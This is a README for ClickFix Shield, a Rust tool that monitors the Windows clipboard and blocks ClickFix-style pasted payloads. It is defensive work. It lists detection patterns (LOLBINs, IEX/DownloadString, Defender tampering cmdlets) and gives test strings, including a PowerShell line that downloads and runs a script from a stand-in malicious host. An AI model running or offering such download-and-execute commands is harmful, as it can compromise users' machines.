🛡️ ClickFix Shield

By Josiah Golden

A lightweight Windows clipboard protection tool built in Rust.
ClickFix Shield detects and blocks suspicious PowerShell or CMD payloads copied to your clipboard —
preventing “ClickFix”-style malvertising attacks before they ever reach your system.


⚙️ What It Does

🧠 Monitors your clipboard for dangerous patterns (PowerShell, CMD, Base64 payloads)

🛑 Automatically clears malicious text before it can be pasted or executed

💾 Logs events to C:\ProgramData\ClickfixShield\shield.log

🪟 Runs silently in the system tray (no console window)

⏸️ Tray menu lets you Pause, Resume, Open Logs, Edit Config, or Exit


🚨 Why It Matters

Modern “ClickFix” and malvertising campaigns trick users into pasting one-liners like:

powershell -nop -w hidden -enc SGVsbG8=


ClickFix Shield intercepts those strings and wipes them before they can run, turning a potential compromise into a harmless copy-paste.


🧩 How It Works

Built in Rust 1.80+

Uses clipboard-win to monitor the Windows clipboard

Detects suspicious patterns via regex

Displays alerts with native Windows APIs (MessageBoxW)

System-tray interface built with tray-icon and tao

Configurable rules stored in JSON (C:\ProgramData\ClickfixShield\config.json)


🧠 Detection Patterns

| **Category**           | **Examples Matched**                        | **Description**                                                            |
| ---------------------- | ------------------------------------------- | -------------------------------------------------------------------------- |
| **LOLBINs**            | `mshta`, `rundll32`, `certutil`, `wmic`     | Living-off-the-land binaries often abused to execute or retrieve payloads. |
| **PowerShell Abuse**   | `IEX`, `DownloadString`, `FromBase64String` | Code execution directly from memory or remote sources.                     |
| **Run-box Commands**   | `powershell ...`, `cmd /c ...`              | Commands likely pasted into Run or terminal prompts.                       |
| **Defender Tampering** | `Set-MpPreference`, `Add-MpPreference`      | Attempts to disable or exclude Windows Defender protections.               |
| **Encoded Payloads**   | Long Base64 strings                         | Obfuscated content typically used for malware delivery.                    |


You can whitelist safe text patterns in config.json via the allow_regex array.


🧰 Installation & Setup

1️⃣ Download or build the binary

cargo build --release


Copy target\release\clickfix-shield.exe to:
C:\ProgramData\ClickfixShield\clickfix-shield.exe

2️⃣ (Recommended) Register Scheduled Task for Auto-Start

Run PowerShell as Admin:

$exe = "C:\ProgramData\ClickfixShield\clickfix-shield.exe"
$taskName = "ClickFixShield"

if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
}

$action = New-ScheduledTaskAction -Execute $exe
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings

3️⃣ Run it once

start "" "C:\ProgramData\ClickfixShield\clickfix-shield.exe"


It will appear in your tray and start monitoring instantly.


🧪 Test It

Copy any of these into your clipboard:

powershell -nop -w hidden -enc SGVsbG8=

IEX(New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')

cmd /c calc.exe

✅ The clipboard clears, an alert appears, and the event is logged.


⚡ Configuration

File: C:\ProgramData\ClickfixShield\config.json

{
  "allow_regex": [
    "^Hello world$",
    "^.*my-safe-snippet.*$"
  ],
  "poll_ms": 300
}


allow_regex: List of safe patterns to skip

poll_ms: Clipboard polling interval (ms)


📦 Build Info

| Field    | Value                         |
| -------- | ----------------------------- |
| Language | Rust                          |
| Version  | 0.2.0                         |
| Platform | Windows 10 / 11               |
| License  | MIT                           |
| Author   | Josiah Golden (@josiahgolden) |



📸 Screenshots (coming soon)

(Add a screenshot of your tray icon and alert popup here.)


🙌 Credits

Created by Josiah Golden (2025)
Built with 🦀 Rust and a mission to make security simpler for everyone.


💬 Connect

LinkedIn: linkedin.com/in/josiahgolden

Youtube: https://youtube.com/@josiahgold3n?si=02n0UaLYue1tVbgk

Instagram: https://www.instagram.com/josiahgold3n/

GitHub: github.com/josiahgolden